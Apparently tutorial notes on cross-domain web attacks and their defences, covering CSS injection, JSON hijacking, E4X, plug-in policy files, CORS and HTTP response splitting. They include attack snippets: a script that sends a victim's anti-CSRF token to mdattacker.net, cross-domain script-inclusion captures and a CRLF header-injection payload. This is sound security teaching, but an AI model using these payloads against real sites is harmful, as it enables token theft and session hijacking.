- Limited HTML injection can be more dangerous than it appears; you don’t always need JavaScript execution to exfiltrate data.

- Browsers’ forgiving parsers—handling of quotes, newlines, and nested tags—are what make these tricks possible.

- Mitigations: strict output encoding, a real HTML sanitizer (or no HTML at all), and modern defenses like *Content Security Policy* with ```default-src 'none'``` or a strong ```frame-ancestors``` policy.

### Capturing Data by Injecting CSS:

Normally the *same-origin policy* blocks JavaScript from reading a response that comes from another domain. That’s why classic CSRF is called a “one-way” attack: you can make the victim’s browser *send* a request elsewhere, but you can’t easily *read* the reply.

Sometimes, however, an application lets you inject plain text into a page viewed by another user—even though it blocks HTML tags like ```<``` or ```>``` to prevent full-blown XSS. Developers often assume such *text-only* injection is harmless.

*Example of “harmless” text injection:* a web-mail app lets you choose any subject line for an email, but escapes ```<``` and ```>``` so it can display the subject safely inside the recipient’s inbox page.

1. The attacker’s CSS payload:

Suppose the attacker sends an email whose *subject* is:

```
{}*{font-family:'
```

- two curly brackets followed by the asterisk: a universal selector inside an empty block—basically a quirky but valid way to target every element.

- ```{font-family:'``` starts a CSS rule that sets the ```font-family``` property to a quoted string … but never closes the quote.

Because there are no ```<``` or ```>``` characters, the app happily displays this subject verbatim inside the victim’s inbox HTML.

2. What the victim’s inbox page looks like:

The rendered response might be:

```
<html>
<head>
  <title>WahhMail Inbox</title>
</head>
<body>
  <td>{}*{font-family:'</td>
  <form action="http://wahh-mail.com/forwardemail" method="POST">
    <input type="hidden" name="nonce" value="2230313740821">
    <input type="submit" value="Forward">
  </form>
  <script>
    var _StatsTrackerId='AAE78F27CB3210D';
  </script>
</body>
</html>
```

The subject line sits inside a table cell as plain text. But if a browser is told to treat this entire page as a *stylesheet*, it will happily parse any CSS-looking fragments it finds—even if the HTML is otherwise a mess. Because the injected rule never closed its quote, the CSS parser keeps reading until it hits another quote character. That means the hidden ```<input>``` with the anti-CSRF token ends up inside the value of the ```font-family``` property.

3. Loading the inbox as a stylesheet:

The attacker now hosts a page like this:

```
<link rel="stylesheet" href="https://wahh-mail.com/inbox" type="text/css">
<script>
  // Ask the browser which font-family got set by that stylesheet
  document.write(
    '<img src="http://mdattacker.net/capture?' +
    escape(document.body.currentStyle.fontFamily) +
    '">'
  );
</script>
```

Breakdown:

- ```<link rel="stylesheet">``` tells the browser to fetch the victim’s inbox *as if it were a CSS file.*

- ```document.body.currentStyle.fontFamily``` (an old IE property) reads the applied font-family.

- ```escape(...)``` URL-encodes the value.

- ```document.write('<img …>')``` causes the browser to request an image from the attacker’s server, appending that encoded font-family value as a query string.

Result: the attacker’s server receives a request whose query string contains the hidden anti-CSRF token and any other data the open quote swallowed.

4. Sample captured URL (decoded):

The victim’s browser might hit:

```
http://mdattacker.net/capture?
</td>
<form action="http://wahh-mail.com/forwardemail" method="POST">
  <input type="hidden" name="nonce" value="2230313740821">
  <input type="submit" value="Forward">
</form>
<script>
  var _StatsTrackerId='AAE78F27CB3210D'
</script>
```

*Note:* the ```<td>``` tag in HTML defines a standard data cell in a table, used to contain content such as text, images, or numbers within a table row (```<tr>```).

Everything after the attacker’s own question mark is the leaked HTML from the inbox page.

*Key Ideas & Present-Day Viability:*

- Internet Explorer (and a few other legacy engines) would parse a full HTML page as CSS if you referenced it via ```<link rel="stylesheet">```.

- CSS rules can include quoted strings that span line breaks.

- The IE-only property ```currentStyle``` lets JavaScript read the resulting values.

*Modern relevance:*

- Current Chromium, Firefox, Safari, and Edge (Chromium-based) no longer allow HTML pages to be treated as stylesheets.

- IE 11—the last version with this quirk—is out of support and effectively dead on the public web.

So today this attack is mostly of historical or niche interest, unless you’re testing a locked-down intranet that still relies on IE’s legacy mode.

*Quick recap:*

- “Text-only” injection isn’t always harmless.

- CSS parsers can be abused to slurp up hidden data if the response is mis-handled.

- Old browsers’ willingness to treat anything as a stylesheet made cross-domain data theft possible—one of the reasons modern browsers tightened same-origin and MIME-type checks.

### JavaScript Hijacking:

JavaScript hijacking is a technique that lets an attacker steal data across domains, effectively turning a one-way CSRF attack into a limited “two-way” data grab.

Normally, the *same-origin policy (SOP)* keeps code from one site from reading data that comes from another. But SOP does allow any page to *include* a ```<script>``` file hosted on a different domain. When that script runs, *it executes in the context of the page that included it*, not in the context of the server that served the file. This behavior is harmless if the script being included contains only public, static code—like a common JavaScript library—because there’s no sensitive information for an attacker to capture.

The problem appears when modern applications use JavaScript itself as a transport for *user-specific data.* Many “Web 2.0” designs update the interface with asynchronous background calls and respond with dynamically generated script. If that script embeds a user’s private details—session data, account info, etc.—then anyone who can trick a browser into including it as a ```<script>``` tag can read the values, even from another domain.

*What does “asynchronous requests” mean here?*

In this context, it refers to *AJAX* (Asynchronous JavaScript and XML, though JSON is more common today). The browser’s JavaScript engine can send a request to the server in the background—without reloading the whole page—and run a callback when the response arrives. This keeps the UI snappy while pulling fresh data.

Because browsers keep broadening what they treat as “valid JavaScript,” more kinds of server responses can be executed as code. That opens new angles for attackers: if the server responds with JavaScript that embeds private data, an attacker-controlled site can simply ```<script src="https://victim.com/sensitiveEndpoint">``` and capture the returned variables.

This section will dig into specific examples of how sensitive script responses are built and how those responses can be hijacked to leak data cross-domain.

#### Function Callbacks:

Imagine a web app that shows a user’s profile when they click a “Profile” tab. To keep the page smooth and reload-free, the app fetches the data with an *asynchronous request*—basically an AJAX call—and then dynamically inserts a ```<script>``` tag like this:

```
https://mdsec.net/auth/420/YourDetailsJson.ashx
```

The server’s response isn’t plain JSON. Instead it returns executable JavaScript that calls a function already defined in the page:

```
showUserInfo(
[
  ['Name',     'Matthew Adamson'],
  ['Username', 'adammatt'],
  ['Password', '4nllub3'],
  ['Uid',      '88'],
  ['Role',     'User']
]);
```

If an attacker hosts their own page, defines the same function name, and simply includes that script, the victim’s browser will happily fetch it—using the victim’s cookies for authentication—and hand the sensitive details to the attacker’s function:

```
<script>
function showUserInfo(data) {
  alert(data); // or send it to an attacker-controlled server
}
</script>
<script src="https://mdsec.net/auth/420/YourDetailsJson.ashx"></script>
```

This exact pattern is rarer today because frameworks tend to serve JSON with the correct ```application/json``` MIME type, use CSRF tokens, and set restrictive CORS headers. But you still see similar problems in misconfigured JSONP endpoints or legacy APIs. If a site offers a “callback” or ```?jsoncallback=``` parameter, treat it with suspicion.

**Pure JSON and the Old Firefox Trick:**

A variation returns *raw JSON* instead of a callback:

```
[
  ['Name',     'Matthew Adamson'],
  ['Username', 'adammatt'],
  ['Password', '4nllub3'],
  ['Uid',      '88'],
  ['Role',     'User']
]
```

Normally, including raw JSON as a ```<script>``` just throws a syntax error—JavaScript expects statements, not a bare array. But older Firefox versions (circa 2006) had a quirk: if you redefined the global ```Array``` constructor with a *custom setter*, the browser would call that setter for every element it initialized when parsing a literal array. Attackers could abuse that to grab each value:

```
<script>
function capture(value) {
  alert(value);  // or exfiltrate it
}
// Override the global Array constructor and attach a setter
function Array() {
  for (var i = 0; i < 5; i++) {
    this[i] setter = capture; // fires whenever an index is assigned
  }
}
</script>
<script src="https://mdsec.net/auth/409/YourDetailsJson.ashx"></script>
```

Here, the “setter” is a special accessor that runs whenever a property is written.

*Additional Notes:*

1. ```function capture(s) { alert(s); }```

Defines a simple helper that pops up any value it’s given. This is where stolen data would surface.

2. Array: ```function Array() { ... }```

Redefines the global ```Array``` constructor itself. Normally ```Array``` is the built-in blueprint for all JavaScript arrays, but here the attacker hijacks it.

3. ```for (var i = 0; i < 5; i++) this[i] setter = capture;```

Inside that fake constructor, the code loops through five indexes and assigns a *custom setter* to each one. In older Firefox, ```this[i] setter = capture;``` was a special syntax that meant: “Whenever a value is assigned to this index, run the ```capture``` function with that value.”

4. ```<script src="…YourDetailsJson.ashx"></script>```

Finally, the attacker includes the vulnerable site’s JSON response as if it were a normal script. Because the response is just a raw JSON array, the browser treats it like JavaScript and executes it. As it parses the JSON, the engine creates a new Array and assigns each element, which—thanks to the hijacked constructor—fires the custom setter and sends each value to ```capture()```.

Overall, when Firefox parsed the JSON, it internally did ```new Array()``` and then assigned each element. Each assignment triggered the attacker’s ```capture()``` function, revealing the contents. Modern browsers fixed this by ensuring that user-defined setters aren’t invoked during native array initialization.

Even though this exact bug is history, the mindset is timeless:

- *Think like the interpreter.* What hidden steps (parsing, coercion, property assignment) happen between the raw response and the final rendered page?

- *Control built-ins.* If you can override or hook something fundamental—constructors, prototypes, event handlers—you can sometimes see or change data at unexpected points.

- *Expect evolution.* New JavaScript features (Proxies, dynamic import, etc.) might open similar “execution on parse” windows in the future.

*Additional Notes:*

- *Constructors* – These are the blueprints for creating objects, like ```Array```, ```Date```, or a custom ```User()```. *Hooking/overriding* a constructor means replacing that blueprint with your own so that every time code does new ```Array()```, it first runs *your* logic.

- *Prototypes* – Every object type in JavaScript has a shared prototype that defines default properties and methods. Changing, say, ```Array.prototype.push``` affects *all* arrays, including ones already created, so you can intercept method calls across the whole page.

- *Event Handlers* – These are callbacks tied to specific events (```onclick```, ```onload```, ```onbeforeunload```, etc.). Overriding or attaching your own lets you intercept user actions or page lifecycle moments and run custom code when those events fire.

Think of it like layers of a machine: constructor = the factory, prototype = the assembly line tools every product shares, event handler = the sensor network that reacts when something happens.

#### Variable Assignment:

Modern web apps often use *asynchronous requests*—background HTTP calls that update parts of the page without a full reload—to keep the interface smooth. Sometimes these requests return JavaScript that’s executed on the fly. If that script contains a sensitive value, like an anti-CSRF token, it can accidentally become available to anyone who can include the script cross-domain.

Imagine the app at ```wahh-network.com``` serves a script that looks like this:

```
var nonce = '222230313740821';
```

If an attacker lures a logged-in victim to a malicious page, the attacker’s page can simply include that script:

```
<script src="https://wahh-network.com/status"></script>
<script>
alert(nonce);
</script>
```

Why it works:

- ```<script src="…">``` pulls the JavaScript from the target site and executes it *in the attacker’s page context*, because the Same-Origin Policy allows cross-domain script *inclusion* (it only blocks *reading* resources like XHR).

- When the remote script runs, it declares a global variable ```nonce```.

- The attacker’s following ```<script>``` block runs in the same page, so ```nonce``` is now just a normal global variable. ```alert(nonce)``` pops the victim’s real token.

Sometimes the sensitive value is set inside a function instead of a bare variable:

```
function setStatus(status) {
  nonce = '222230313740821';
}
```

The attacker can still reach it:

```
<script src="https://wahh-network.com/status"></script>
<script>
setStatus('a');
alert(nonce);
</script>
```

Breakdown:

1. The attacker’s page loads the target’s script.

2. That script defines the function ```setStatus```, but doesn’t yet run it.

3. The attacker explicitly calls ```setStatus('a')```.

4. Inside the function, ```nonce``` is assigned (no ```var``` keyword, so it becomes global).

5. ```alert(nonce)``` retrieves the token.

*Key Takeaways:*

- *Cross-domain script inclusion* is allowed: a page can execute another site’s JavaScript, but can’t read it via XHR. If the remote script *itself* exposes secrets, the attacker wins.

- Any sensitive value in a globally reachable variable—whether set directly or inside a function—is effectively public.

- Defenses: never embed user-specific secrets in scripts meant to be included directly. Use separate APIs that require same-origin requests or enforce CORS, and send secrets only through protected channels.

This shows how something that “looks too simple to be true” really can be that simple when scripts carelessly drop secrets into the global scope.


#### E4X (ECMAScript for XML):

E4X—short for *ECMAScript for XML*—was an extension to JavaScript that let developers treat XML as a first-class data type. You could literally drop XML markup inside JavaScript code and manipulate it with native syntax, instead of juggling ```DOMParser``` or string concatenation.

E4X was once supported in Firefox and a few other engines (like old Rhino builds), but it’s now *obsolete and fully removed.* Mozilla ripped it out starting with Firefox 17 (2012) because of poor adoption and security headaches. Today, no mainstream browser supports E4X, but the history is still a good lesson in “new language feature = new attack surface.”

*How E4X Worked:*

A developer could write:

```
var foo = <bar>{prompt('Please enter the value of bar.')}</bar>;
```

Breakdown:

- ```<bar> … </bar>``` is literal XML embedded in JavaScript.

- Inside the ```{…}``` braces, normal JavaScript executes. Here it calls ```prompt()```, and the user’s input becomes the text node inside the ```<bar>``` element.

- After execution, ```foo``` is an XML object like ```<bar>userInput</bar>```.

Two key quirks made this dangerous:

1. *Well-formed XML is executable as a value.*

You could just drop an entire HTML page into a ```<script>``` tag as if it were E4X and the engine would parse it.

2. *The ```{…}``` syntax executes JavaScript inline.*

Anything inside those braces ran immediately and could reach surrounding scope.

*Example of the Old Vulnerability:*

Suppose a target site returns this HTML:

```
<html>
<head>
<script>
function setNonce() {
  nonce = '222230313740821';
}
</script>
</head>
<body></body>
</html>
```

Because this is mostly well-formed XML, an attacker could—back in the vulnerable Firefox days—do:

```
<script src="https://victim.example/profile"></script>
```

Firefox would happily treat the fetched HTML as E4X. If the attacker had injected a little extra into the response, say wrapping the sensitive value with ```{…}```:

```
{nonce}
```

…the browser would actually execute the code inside the braces during E4X parsing, leaking the token into the attacker’s page context.

A crafted injection might look like:

```
</script>{alert(nonce)}<script>
```

If that snippet was reflected into the target page and the whole response was then included cross-domain as a ```<script>```, the attacker’s ```alert``` (or any data-exfil routine) would run.

*Takeaways for Today:*

- *Language features can become side channels.* E4X shows how something added for developer convenience can bypass the same-origin policy in surprising ways.

- *Assume future features will break old assumptions.* Modern JavaScript keeps gaining syntax—template literals, dynamic import, etc.—and each change is a potential vector if apps embed secrets directly in pages.

- *Principle still matters:* Never return user-specific secrets in responses that can be blindly included as scripts, regardless of how “niche” the embedding feature seems.

Even though E4X itself is dead, the mindset it taught—*scrutinize every new parser or syntax that can execute code*—is timeless for web security.

### Preventing JavaScript Hijacking:

A JavaScript-hijacking (aka “JSON-Hijacking”) attack only works if several conditions line up. Defense is about breaking at least one of those conditions—and ideally a few at once for defense-in-depth.

1. Standard anti-CSRF on sensitive requests:

If an action requires a logged-in session (changing a password, retrieving private data, etc.), treat it like any other CSRF-prone endpoint. Add tokens, SameSite cookies, or other anti-CSRF measures so a malicious site can’t silently trigger a cross-domain request that returns confidential data to a victim’s browser.

2. Wrap or mangle dynamic script responses:

Sometimes a web app serves JavaScript that isn’t static—it’s generated on the fly, maybe including user-specific data. Traditionally, that code might be pulled in with a simple ```<script src="...">```. The problem: a malicious page can also use ```<script>``` to fetch that same URL and read the data if the output is valid JavaScript.

The fix is to make the response *look* like JavaScript to a browser but *break* when executed as a straight ```<script>``` include. Because your own client code can fetch the resource via ```XMLHttpRequest``` (or ```fetch```) from the same origin, it can preprocess the text and strip out the “poison pill” before evaluating it.

Example poison pill:

```
for(;;);
```

Placed at the very top of the response, this infinite loop immediately locks execution if an attacker tries to load it with a ```<script>``` tag. Your legitimate client, however, retrieves the raw text using ```fetch()```, slices off that first line, and safely ```eval```s or parses the remainder. Think of it as adding a deliberate syntax “speed bump” that only your own code knows how to remove.

3. Require POST for script endpoints:

Another way to break the attacker’s setup is to force those dynamic-script URLs to accept only HTTP POST. A ```<script src>``` tag can only issue a GET request, never a POST. If your client retrieves the code with ```fetch()``` or ```XMLHttpRequest```, it can easily send a POST, but an attacker’s ```<script>``` include will fail.

This works neatly with the previous step:

- client sends a POST, server returns the mangled JavaScript payload, client unmangles and executes it.

- a cross-domain attacker trying ```<script src="…">``` hits a 405 (Method Not Allowed) or CSRF token check and gets nothing useful.

*In short:*

-  Use CSRF defenses for any action that leaks or mutates sensitive data.

- Poison” dynamic script so a plain ```<script>``` tag chokes.

- Make the script endpoint POST-only to kill trivial cross-site includes.

That combo severs the usual paths a hijacker would need, while your legitimate code keeps working just fine.

#### Same-Origin Policy: A Quick Recap

The same-origin policy (SOP) is the browser’s core boundary: scripts from one origin (protocol + host + port) can’t freely read or modify data from another. Most of the attacks we’ve explored—XSS, CSRF, JSON hijacking—try to poke holes in or work around this rule. But SOP isn’t limited to plain HTML + JavaScript. Historically, browser extensions and old plug-ins such as Flash had their own spins on it, which created extra angles for cross-domain abuse.

### Browser Extensions:

Modern extensions (Chrome/Edge add-ons, Firefox WebExtensions) inherit SOP principles but add their own permission models. If an extension is granted broad host permissions or mishandles messages between its background page and content scripts, a malicious site can sometimes abuse those privileges to reach data outside its origin. Key takeaway: an extension’s manifest and message-passing code must be treated as part of the attack surface.

#### Flash and Cross-Domain Policies (Historical but Educational):

Adobe Flash is dead in mainstream browsers, but the pattern it used is still a classic lesson in delegated trust.

*Origin of a Flash object:* A SWF’s origin is the domain where the SWF file itself is hosted, not the HTML page that embeds it.

*Default rule:* By default, a Flash movie could send cross-domain HTTP requests (GET/POST, custom headers) using ```URLRequest```. Cookies from the browser’s jar went along, but the response body was hidden unless the target site explicitly allowed it.

*Granting permission:* To grant that extra access, a site would publish an XML policy file—```/crossdomain.xml```—saying which other domains may read its data. Example (simplified from Adobe’s own):

```
<?xml version="1.0"?>
<cross-domain-policy>
  <!-- Allow Flash files served from macromedia.com and its subdomains -->
  <allow-access-from domain="*.macromedia.com" />
  <!-- Allow exactly adobe.com -->
  <allow-access-from domain="adobe.com" />
  <!-- Allow Photoshop and Acrobat subdomains -->
  <allow-access-from domain="*.photoshop.com" />
  <allow-access-from domain="*.acrobat.com" />
</cross-domain-policy>
```

Breakdown:

- ```<allow-access-from domain="*.macromedia.com" />``` – Wildcard for all subdomains.

- Multiple ```<allow-access-from>``` entries – Fine-grained control.

- Optional attributes like ```secure="true"``` could restrict to HTTPS.

If a domain carelessly used ```<allow-access-from domain="*"/>```, *any* SWF from *any* origin could read user data while riding on the victim’s cookies—a perfect cross-site data theft.

*Attack Lessons That Still Matter:*

Even though Flash is gone, the principles echo in modern APIs (CORS, cross-origin resource sharing):

1. Least privilege:

Never grant ```*``` access unless absolutely required. Over-broad CORS rules are today’s equivalent of a loose ```crossdomain.xml```.

2. Chained trust:

If a site allows only “trusted subdomains,” an XSS on any subdomain collapses the whole trust boundary.

3. Unexpected policy locations:

Flash allowed a SWF to request a *custom* policy URL if ```/crossdomain.xml``` didn’t exist. If an attacker could upload arbitrary XML to your site, they could plant a malicious policy and trick Flash into reading it—an early example of “policy injection.”

*Practical Pentest Tips:*

- Even now, scanning for ```/crossdomain.xml``` can reveal forgotten legacy files disclosing internal hostnames or old partner domains.

- Treat any similar policy files (CORS configs, ```.well-known/``` endpoints, S3 bucket CORS settings) the same way: review for ```*``` wildcards, stale partner domains, or accidental leaks.

#### Same-Origin Policy and Silverlight:

Microsoft Silverlight was a browser plug-in (roughly 2007–2015) meant to compete with Adobe Flash for delivering rich, app-like media experiences in the browser. It used a sandboxed .NET runtime and XAML markup, so developers could build interactive apps with C# or VB that ran inside Internet Explorer, Firefox, and a few other browsers. Although Silverlight is officially dead and unsupported, the way it handled cross-domain data is still worth knowing because it mirrors patterns we still see in modern tech.

*Origin Rules:*

- Like Flash, a Silverlight object’s “origin” is the *domain of the XAP file* (the packaged Silverlight app) from which it’s loaded—not the HTML page embedding it.

- Unlike Flash, Silverlight *ignores protocol and port* when determining origin. If you served a Silverlight app over plain HTTP, it could freely talk to the same host over HTTPS on any port. This weaker segregation made mixed-content or downgrade attacks easier.

Silverlight used its own XML policy file: ```/clientaccess-policy.xml``` at the site’s root. Example:

```
<?xml version="1.0" encoding="utf-8"?>
<access-policy>
  <cross-domain-access>
    <policy>
      <allow-from>
        <domain uri="http://www.microsoft.com"/>
        <domain uri="http://i.microsoft.com"/>
        <domain uri="http://i2.microsoft.com"/>
        <domain uri="http://i3.microsoft.com"/>
        <domain uri="http://i4.microsoft.com"/>
        <domain uri="http://img.microsoft.com"/>
      </allow-from>
      <grant-to>
        <resource path="/" include-subpaths="true"/>
      </grant-to>
    </policy>
  </cross-domain-access>
</access-policy>
```

Breakdown:

- ```<allow-from>``` – Whitelist of external domains allowed to make full two-way requests into this site.

- ```<grant-to>``` – Which resources those external domains may reach. Here, ```path="/" include-subpaths="true"``` means “anything on the site.”

If the file contained ```<domain uri="*"/>```, it would have allowed *any* Silverlight app anywhere to read/write user data on that domain while riding on the user’s cookies—classic cross-site data theft.

If ```/clientaccess-policy.xml``` didn’t exist, the Silverlight plug-in automatically looked for the Flash policy file ```/crossdomain.xml``` and applied it. So a sloppy Flash policy could silently grant Silverlight the same dangerous privileges.

*Modern Lessons:*

Even though the plug-ins are gone, the pattern is timeless:

1. *Static policy files* that delegate cross-origin access (today: CORS configs, S3 bucket rules) need strict least-privilege rules—never a wildcard unless unavoidable.

2. *Protocol/port assumptions* matter. Silverlight’s failure to separate HTTP from HTTPS is a reminder to treat scheme and port as part of the trust boundary.

3. *Legacy files linger.* During pentests, checking for ```/clientaccess-policy.xml``` and ```/crossdomain.xml``` can still uncover forgotten, overly permissive settings or internal hostnames.

In short, Silverlight may be buried next to Flash, but the security mindset it required—tight origin control and careful cross-domain permissions—lives on in modern web apps and cloud storage configurations.

#### Same-Origin Policy and Java Applets:

Java applets—tiny Java programs embedded in a web page—followed a same-origin model similar to the browser’s own rules:

- *Origin is the JAR file’s host* – The “home” of an applet is the domain that served the ```.jar``` or ```.class``` files, not the HTML page that embedded it.

- *Network calls* – By default an unsigned applet could open sockets only back to that host.

- *DOM access* – Applets could talk to the page’s JavaScript only if both shared that origin.

*Odd Exception:*

Older Java plug-ins treated any host that resolved to the *same IP address* as the applet’s origin as equivalent. On shared hosting, two unrelated sites living on the same IP could occasionally poke at each other through applet-initiated requests. This wasn’t a full bypass, but it widened the attack surface for cross-domain shenanigans.

*No “Policy File” Mechanism:*

Unlike Flash (```/crossdomain.xml```) or Silverlight (```/clientaccess-policy.xml```), Java offered *no simple server-side file* to grant extra cross-domain rights. The only way to relax the sandbox was to *sign the applet with a trusted certificate*, after which the user would see a scary dialog and have to click “Allow.” That prompt (and later mandatory permission dialogs) became the weak link—many social-engineering attacks simply tricked users into approving a malicious signed applet.

*Status Today:*

- The *Java browser plug-in is effectively dead.* Major browsers dropped NPAPI support years ago (Chrome 2015, Firefox 2017, Edge never).

- Modern Java is mostly server-side (Spring, Jakarta EE) or desktop (JavaFX, Swing).

- If you ever find an old intranet that still relies on applets, treat it like exposed fossil fuel: Check for outdated JREs with remote-code-execution CVEs. Look for places where DNS or shared-hosting tricks could let you impersonate the origin host.

*Key Takeaways for Today’s Web Security:*

1. *Origin determination matters* – Even subtle “same IP” shortcuts can undermine isolation.

2. *Legacy tech lingers* – During pentests, scanning for leftover ```.jar``` downloads or ```<applet>``` tags can reveal forgotten attack surfaces.

3. *Signed-code prompts ≠ safety* – User consent dialogs are weak defenses; the lesson carries over to modern signed-binary ecosystems (desktop installers, browser extensions, mobile apps).

#### The Same-Origin Policy and HTML5:

Traditionally, the *Same-Origin Policy (SOP)* limits JavaScript’s ```XMLHttpRequest``` (XHR) so that a page can only fetch data from the exact same origin (scheme + host + port) that served the page.

HTML5 introduces *Cross-Origin Resource Sharing (CORS)*, which relaxes that rule. With CORS, a server can explicitly allow two-way interaction with other domains by sending special HTTP response headers.

*Normal Requests vs. “Preflighted” Requests:*

When a script tries to call an external domain with XHR, the browser decides how to handle it based on the type of request.

- *Simple (a.k.a. “normal”) requests:*

These use standard HTTP verbs (```GET```, ```HEAD```, or ```POST``` with ```application/x-www-form-urlencoded```, ```multipart/form-data```, or ```text/plain```) and no custom headers.

*The browser sends the request right away.* After the response comes back, it checks for ```Access-Control-Allow-Origin```. If the value matches the calling page’s ```Origin``` or is a wildcard (```*```), the browser releases the response to the script; otherwise it blocks access.

- *Preflighted (complex) requests:*

Any request that uses non-standard HTTP methods (e.g. ```PUT```, ```DELETE```), a non-simple ```Content-Type```, or custom headers triggers a *preflight.*

The browser first sends an ```OPTIONS``` request to the target URL, asking, in effect: “May I make the real request?” Only if the server replies with the right CORS headers will the browser send the actual request.

*Key Headers and Their Meanings:*

The browser automatically includes:

```
Origin: https://attacker.example
```

Identifies the calling page’s origin so the target server can decide whether to allow it.

When preflighting, the browser may also send:

```
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-PINGOTHER
```

Tells the server what method and custom headers the real request will use.

The server’s CORS response can include:

```
Access-Control-Allow-Origin: https://wahh-app.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-PINGOTHER
Access-Control-Max-Age: 1728000
```

- *Access-Control-Allow-Origin* – Domains allowed to read the response. ```*``` means any origin (risky if credentials are involved).

- *Access-Control-Allow-Methods* – HTTP verbs permitted for cross-origin calls.

- *Access-Control-Allow-Headers* – Which custom request headers the browser may send.

- *Access-Control-Max-Age* – Seconds the browser can cache this preflight approval.

*Testing with Burp or Similar:*

Yes—this is exactly the kind of thing you can probe by adding or modifying headers in Burp:

- Manually insert an ```Origin``` header with a domain you control.

- Watch the response for ```Access-Control-Allow-*``` headers.

- Try an ```OPTIONS``` preflight request to see what methods/headers are allowed.

Example preflight probe:

```
OPTIONS /api/update HTTP/1.1
Host: target.example
Origin: https://evil.example
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom
```

If a site responds with ```Access-Control-Allow-Origin: *``` or a poorly restricted list, any attacker-controlled page can:

- Read sensitive API responses.

- Perform authenticated actions if the user’s cookies are automatically sent (unless the server sets ```Access-Control-Allow-Credentials: true```, most browsers omit cookies by default).

Because HTML5 enables full cross-domain XHR, older code that dynamically loads files via user-supplied URLs can become vulnerable to *client-side remote file inclusion.* An attacker could trick the app into pulling in arbitrary content from their own server.

*Beyond Data Theft: Other Abuse*

- *Cross-domain port scanning* – Scripts can time the responses from XHR calls to internal IPs or uncommon ports and infer open/closed/filtered status.

- *Browser-based DDoS* – Malicious pages can fire thousands of CORS-denied requests per second to a victim host. Even though responses are blocked, the TCP connections still consume bandwidth and resources. Attackers often randomize a query string (```?cachebust=12345```) so each request is unique and not cached. This isn’t the preferred method for serious botnet operators (amplification attacks or direct malware give more muscle), but it remains a real nuisance for smaller targets—especially when combined with many unwitting browsers at once.

*Hack Steps:*

1. Probe for CORS misconfigurations:

Send requests with a fake or attacker-controlled ```Origin``` header. Check if the response includes permissive ```Access-Control-*``` headers.

2. Map allowed methods and headers:

Send an ```OPTIONS``` request as shown above to discover what the server will let cross-domain callers do.

Treat any overly broad ```Access-Control-Allow-Origin``` as equivalent to granting the entire internet the ability to read your private API.

#### Crossing Domains with Proxy Service Applications:

Some public services act as *content proxies:* they fetch a URL you supply and then return that content to the user *from the proxy’s own origin.* Google Translate is a canonical example — you ask it to fetch ```https://example.com/foo```, and the browser ends up seeing the returned HTML as if it came from ```translate.google.com```. That changes the browser’s origin view: two otherwise unrelated external pages fetched via the same proxy now *appear* to be from the same origin (the proxy), so scripts running inside the proxy-origin can interact with both fetched pages as if they were same-origin with each other.

*Quick ADFS note:* Active Directory Federation Services (ADFS) is an identity-federation/SSO solution (SAML/OAuth) — not a generic content proxy. It mediates authentication claims between identity providers and service providers, but it does *not* typically fetch arbitrary third-party pages and re-serve their HTML under its own origin. So conceptually both are “middlemen,” but ADFS is about identity tokens and trust, while GT-style proxies rewrite origin boundaries for arbitrary content.

*Why this matters:* If your script runs inside the proxy-origin, it can request two different external URLs *through the proxy* and the browser will treat both responses as same-origin resources (because the responses are served from the proxy domain). That allows two-way JS interaction *between those two fetched documents* inside the proxy-origin. Importantly, this only applies to the *content* as delivered by the proxy — it does *not* magically make the browser send a site’s cookies to the proxy. So authenticated sessions on the original sites remain protected (the proxy won’t receive the victim’s cookies for the original site), but public, unauthenticated content served via the proxy can be probed and manipulated by code executing in the proxy-origin.

*Jikto worm (how it uses the proxy):*

- The worm checks whether it’s already running under the proxy domain; if not, it reloads its current URL via the proxy so its code ends up executing from the proxy origin.

- From that context it can fetch arbitrary public pages on other domains through the proxy and interact with them as same-origin content.

- It scans those pages for persistent XSS (public input points like forums), and when it finds one it injects a copy of itself there. A visitor to the compromised site then executes the worm, which tries to move itself into the proxy-origin and repeat.

Unpack: the *merging step* — causing two different external pages to be treated as same-origin by the browser — *doesn’t require the external sites to be vulnerable* (you only need the proxy to fetch them). That means an attacker can *scan* and *interact with* public pages via the proxy without first finding a bug on those pages. However, to *compromise* or persist on those external sites (for example, to upload malicious JS that executes when other users visit) you still need a vulnerability on the target (e.g., persistent XSS). In the book the statement’s stronger claim about “cannot realistically be defended against” applies to the difficulty of stopping a generic public proxy from existing or being abused — you can’t prevent arbitrary third-party proxies from fetching public pages — so you must design applications assuming public content could be reflected and inspected via proxies.

Short summary: proxies like Google Translate change the browser’s origin model for fetched content, enabling same-origin interaction of proxied pages (great for scanning and cross-document interaction), but they don’t forward victims’ site cookies — so authenticated actions still need exploitable bugs on the target. Design and harden apps accordingly: sanitize public inputs, avoid persistent XSS, and keep sensitive endpoints protected by tokens/cookies bound to origins rather than relying on obscurity.

### HTTP Header Injection / HTTP Response Splitting:

HTTP header injection happens when user input is inserted into an HTTP header without proper validation/encoding. If an attacker can inject CR (```0x0D```) or LF (```0x0A```) characters (often URL-encoded as ```%0d``` and ```%0a```), they can terminate the header they control and add new headers or even start a new response body — a classic *HTTP response splitting scenario.*

Safe intent:

```
GET /settings/12/Default.aspx?Language=English
Host: mdsec.net
```

Server returns:

```
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
```

If ```Language``` is unsafely reflected and attacker sends ```Language=English%0d%0aSet-Cookie:%20Evil=1```, the server may produce:

```
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
Set-Cookie: Evil=1
```

or even split the response body — letting the attacker inject arbitrary HTML, set cookies, poison caches, perform XSS, hijack sessions, or force redirects.

Consequences include XSS, session fixation/cookie injection, cache poisoning (poisoned content served to other users), and open-redirects or phishing via forged Location headers.

*How to test quickly:* send inputs with ```%0d```, ```%0a```, or ```%0d%0a``` in header-valued parameters and observe response headers (Burp Intruder or manual crafted requests). Check caches/CDNs for poisoned entries afterwards.

*Defenses (practical):* never concatenate raw input into headers — use your framework’s header APIs which validate/encode values; strip or reject CR/LF from header values; validate against an allow-list (e.g., expected language codes); ensure cookies are set server-side via safe APIs (use ```HttpOnly```, ```Secure```, ```SameSite```); and normalize inputs before using them in headers or redirect targets.

*Hack Steps:*

1. Find where user input ends up in response headers (Location, Set-Cookie, etc.).

2. Send payloads containing URL-encoded CR/LF (```%0d```, ```%0a```) and intercept the *raw* HTTP response in Burp/Proxy — you must see actual newline characters in the header block, not the literal ```%0d``` text.

